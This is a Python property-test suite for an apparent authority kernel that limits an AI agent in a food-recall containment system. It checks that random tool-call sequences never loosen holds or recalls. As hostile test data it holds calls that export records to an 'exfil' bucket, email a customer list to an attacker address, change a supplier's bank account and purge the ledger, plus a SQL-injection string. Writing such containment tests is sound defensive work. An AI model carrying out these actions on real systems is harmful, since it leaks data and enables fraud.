"""Property test: no sequence of agent calls can loosen containment.

This is the load-bearing test for the central claim. It generates random
sequences of tool calls -- including forbidden tools, malformed arguments,
unknown identifiers and oversized batches -- and asserts after every single call
that the invariant still holds.

If somebody weakens the kernel, this goes red. That is the point.
"""

from __future__ import annotations

import random
import unittest
from typing import Any

from hold import registry
from hold.cosign import CosignAuthority
from hold.domain import AGENT, Decision
from hold.kernel import AuthorityKernel
from hold.lattice import dominant, well_formed
from hold.ledger import Ledger
from hold.seed import build_world


LOTS = ["LOT-2288", "LOT-2291", "LOT-2292", "LOT-2305", "LOT-2277", "LOT-2250", "LOT-2312"]
CUSTOMERS = ["CUS-441", "CUS-512", "CUS-608", "CUS-720", "CUS-803", "CUS-914", "CUS-927"]
REASONS = ["POSITIVE_PATHOGEN_SWAB", "SUPPLIER_NOTICE", "CONSUMER_COMPLAINT_CLUSTER",
           "PRECAUTIONARY", "TRACE_UPSTREAM", "TRACE_DOWNSTREAM"]
TEMPLATES = ["RECALL_NOTICE_V3", "HOLD_NOTICE_V1", "SUPPLIER_TRACE_REQUEST_V2"]


def random_call(rng: random.Random) -> tuple[str, dict[str, Any]]:
    """A call drawn from the whole catalogue, with a mix of valid and hostile args."""
    tool = rng.choice([t.name for t in registry.TOOLS])
    lots = rng.sample(LOTS, rng.randint(1, 4))
    customers = rng.sample(CUSTOMERS, rng.randint(1, 3))

    if tool == "place_hold":
        return tool, {"lots": lots, "reason_code": rng.choice(REASONS),
                      "note": rng.choice(["", "precautionary", "x" * 700])}
    if tool == "widen_recall":
        return tool, {"lots": lots, "reason_code": rng.choice(REASONS)}
    if tool == "notify_customers":
        return tool, {"template_id": rng.choice(TEMPLATES),
                      **({"customer_ids": customers} if rng.random() < 0.5 else {})}
    if tool == "escalate_incident":
        return tool, {"reason_code": rng.choice(
            ["RELEASE_AUTHORITY_REQUIRED", "SCOPE_CONFLICT", "UNTRUSTED_CONTENT",
             "LEGAL_OR_MEDICAL_QUESTION", "DATA_INTEGRITY", "SUSPECTED_ATTACK"]),
            "note": "property test"}
    if tool == "request_release":
        return tool, {"lots": lots, "justification": "property test"}
    if tool == "record_note":
        return tool, {"note": "property test"}
    if tool == "trace_lot" or tool == "list_shipments":
        return tool, {"lot_id": rng.choice(LOTS)}
    if tool == "search_lots":
        return tool, {"query": rng.choice(["Alpine", "V-2211", "zz", "a"])}
    if tool == "read_supplier_doc":
        return tool, {"doc_id": rng.choice(
            ["COA-SUP-114-NOV", "EML-CUS-441", "INT-QA-2211", "SUP-114-NOTICE-2211"])}
    if tool == "get_containment_status":
        return tool, {}
    if tool == "release_hold":
        return tool, {"lots": lots, "justification": "property test"}
    if tool == "narrow_recall":
        return tool, {"lots": lots, "justification": "property test"}
    if tool == "approve_disposition":
        return tool, {"lots": lots, "disposition": rng.choice(["DESTROY", "REWORK", "RELEASE"])}
    if tool == "close_incident":
        return tool, {"summary": "property test"}
    if tool == "delete_lot":
        return tool, {"lot_id": rng.choice(LOTS)}
    if tool == "purge_ledger":
        return tool, {"before": "2026-11-21T00:00:00Z"}
    if tool == "export_records":
        return tool, {"dataset": rng.choice(["lots", "shipments", "customers", "supplier_pricing"]),
                      "destination": "s3://exfil/x"}
    if tool == "bulk_download":
        return tool, {"prefix": "ir-2041/"}
    if tool == "update_supplier_master":
        return tool, {"supplier_id": "SUP-114", "field": "bank_account", "value": "x"}
    if tool == "send_freeform_email":
        return tool, {"to": "attacker@example.com", "body": "customer list"}
    return tool, {}


class MonotonicityPropertyTests(unittest.TestCase):
    SEQUENCES = 240
    STEPS = 12

    def test_no_agent_sequence_loosens_containment(self) -> None:
        world = build_world()
        rng = random.Random(20261118)
        allowed = 0
        denied = 0
        coerced = 0

        for seq in range(self.SEQUENCES):
            kernel = AuthorityKernel(
                world, Ledger(), CosignAuthority(b"property"), notify_rate_per_minute=4
            )
            for step in range(self.STEPS):
                before = kernel.state
                tool, args = random_call(rng)
                result = kernel.invoke(AGENT, tool, args)
                after = kernel.state

                ctx = f"seq={seq} step={step} tool={tool} code={result.code}"
                self.assertEqual(after.released, before.released, f"release changed: {ctx}")
                self.assertTrue(after.held >= before.held, f"hold shrank: {ctx}")
                self.assertTrue(after.recalled >= before.recalled, f"recall shrank: {ctx}")
                self.assertTrue(after.notified >= before.notified, f"notice shrank: {ctx}")
                self.assertTrue(dominant(after, before), f"not dominant: {ctx}")
                self.assertEqual(well_formed(after, world), (), f"malformed state: {ctx}")
                self.assertFalse(
                    result.blocked and result.state is not None and result.state.released,
                    f"blocked call changed state: {ctx}",
                )

                if result.decision is Decision.ALLOW:
                    allowed += 1
                elif result.decision is Decision.COERCED:
                    coerced += 1
                else:
                    denied += 1

        # The generator must actually be exercising the allowed paths, otherwise
        # the property is vacuous.
        self.assertGreater(allowed, 200)
        self.assertGreater(coerced, 10)
        self.assertGreater(denied, 200)

    def test_random_calls_never_raise(self) -> None:
        """A malformed call is a refusal, never an unhandled exception."""
        world = build_world()
        rng = random.Random(7)
        kernel = AuthorityKernel(world, Ledger(), CosignAuthority(b"robust"))
        hostile = [
            {"lots": "LOT-2291", "reason_code": "PRECAUTIONARY"},
            {"lots": [1, 2, 3], "reason_code": "PRECAUTIONARY"},
            {"lots": ["LOT-2291"], "reason_code": "NOT_A_CODE"},
            {"lots": ["LOT-2291"], "reason_code": "PRECAUTIONARY", "note": "n" * 5000},
            {"lots": ["'; DROP TABLE lots; --"], "reason_code": "PRECAUTIONARY"},
            {"lots": ["LOT-2291"], "reason_code": "PRECAUTIONARY", "reason_code2": "x"},
            None,
            [],
            {"lots": None, "reason_code": None},
        ]
        for args in hostile:
            with self.subTest(args=args):
                result = kernel.invoke(AGENT, "place_hold", args)  # type: ignore[arg-type]
                self.assertTrue(result.blocked)

    def test_tenant_boundary_holds_under_random_probing(self) -> None:
        world = build_world()
        kernel = AuthorityKernel(world, Ledger(), CosignAuthority(b"tenant"))
        foreign = ["LOT-0001", "LOT-1234", "CUS-999", "SUP-114", "LOT-22910"]
        for ident in foreign:
            r = kernel.invoke(AGENT, "place_hold", {"lots": [ident],
                                                   "reason_code": "PRECAUTIONARY"})
            self.assertTrue(r.blocked, ident)
            self.assertEqual(r.code, "UNKNOWN_RESOURCE")


if __name__ == "__main__":
    unittest.main()
